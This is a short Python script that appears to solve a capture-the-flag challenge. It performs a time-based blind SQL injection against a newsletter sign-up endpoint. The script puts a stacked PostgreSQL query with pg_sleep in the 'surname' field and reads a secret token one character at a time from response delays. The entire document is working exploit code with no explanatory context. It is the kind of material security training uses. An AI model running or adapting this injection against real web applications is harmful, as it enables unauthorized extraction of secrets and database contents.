from requests import post
from string import ascii_lowercase, digits
from datetime import timedelta


def blind():
    characters = f'\u007d{digits}{ascii_lowercase}_\-!@#$%^&*?'
    flag = 'WSIZ{'
    for i in range(6, 65):
        for c in characters:
            t = post('http://challenges.wsi.edu.pl:5019/newsletter', json={'email': 'a', 'first_name': "'",
            'surname': f";SELECT CASE WHEN substring((SELECT value FROM tokens), {i}, 1) = '{c}' THEN pg_sleep(0.01) ELSE pg_sleep(0) END --"}).elapsed
            if t > timedelta(seconds=1):
                print(f'#{i} = {c}')
                flag += c
                if c == '}': return flag
                break


if __name__ == '__main__':
    print(blind())
